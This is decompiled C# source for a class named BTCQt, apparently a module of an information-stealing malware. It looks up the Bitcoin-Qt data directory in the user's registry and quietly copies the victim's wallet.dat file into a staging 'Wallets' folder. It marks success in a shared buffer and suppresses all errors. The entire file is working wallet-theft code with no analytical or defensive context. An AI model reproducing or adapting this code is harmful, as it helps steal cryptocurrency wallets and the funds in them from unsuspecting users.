using System;
using System.IO;
using Microsoft.Win32;

// Token: 0x02000002 RID: 2
internal class BTCQt
{
	// Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250
	public static void Start()
	{
		string text = string.Format("{0}Wallets", global::Buffer.path_l);
		try
		{
			if (!Directory.Exists(text))
			{
				Directory.CreateDirectory(text);
			}
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Bitcoin").OpenSubKey("Bitcoin-Qt");
			if (registryKey.GetValue("strDataDir") != null)
			{
				string text2 = registryKey.GetValue("strDataDir").ToString();
				if (Directory.Exists(text2))
				{
					if (File.Exists(string.Format("{0}\\wallet.dat", text2)))
					{
						File.Copy(string.Format("{0}\\wallet.dat", text2), string.Format("{0}\\btqt-wallet.dat", text), true);
						global::Buffer.XBufferData[7] = "1";
					}
					else if (Directory.Exists(string.Format("{0}\\wallets", text2)) && File.Exists(string.Format("{0}\\wallets\\wallet.dat", text2)))
					{
						File.Copy(string.Format("{0}\\wallets\\wallet.dat", text2), string.Format("{0}\\btqt-wallet.dat", text), true);
						global::Buffer.XBufferData[7] = "1";
					}
					else
					{
						global::Buffer.XBufferData[7] = "0";
					}
				}
			}
			registryKey.Close();
		}
		catch
		{
		}
	}
}
